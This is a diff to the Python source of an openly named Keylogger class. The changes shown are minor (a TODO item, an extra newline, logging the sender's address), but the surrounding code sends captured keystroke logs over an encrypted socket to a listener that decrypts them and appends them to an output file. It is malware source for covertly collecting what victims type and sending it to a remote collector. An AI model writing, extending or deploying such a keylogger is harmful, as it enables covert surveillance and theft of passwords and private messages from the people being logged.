@@ -16,6 +16,7 @@ from datetime import datetime
 
 # Master TODO
 # 1. Implement keyboard interrupt handling
+# 2. Add pretty colors :^)
 
 # Classes for good python developer standards :)!
 class Keylogger:
@@ -106,7 +107,7 @@ class Keylogger:
             self.end_time = datetime.now()
 
             # If there is keystrokes to send, send them :^)
-            payload = f"\n--- New Log Instance @ {self.time} ---\n{self.log}\n--- End Of Log Instance @ {self.end_time} ---\n"
+            payload = f"\n--- New Log Instance @ {self.time} ---\n{self.log}\n--- End Of Log Instance @ {self.end_time} ---\n\n"
             self.socket.send(self.encrypt(payload))
 
         self.log = ""
@@ -176,6 +177,7 @@ class Keylogger:
                 else:
                     payload = self.decrypt(buf).decode('UTF-8')
                     with open(self.args.outfile, "a") as f:
+                        f.write(f"Connection from {client_socket.getpeername()[0]}:{client_socket.getpeername()[1]}")
                         f.write(payload)
                         print(f"[+] Wrote data to {self.args.outfile} @ {datetime.now()}")
                         buf = b""
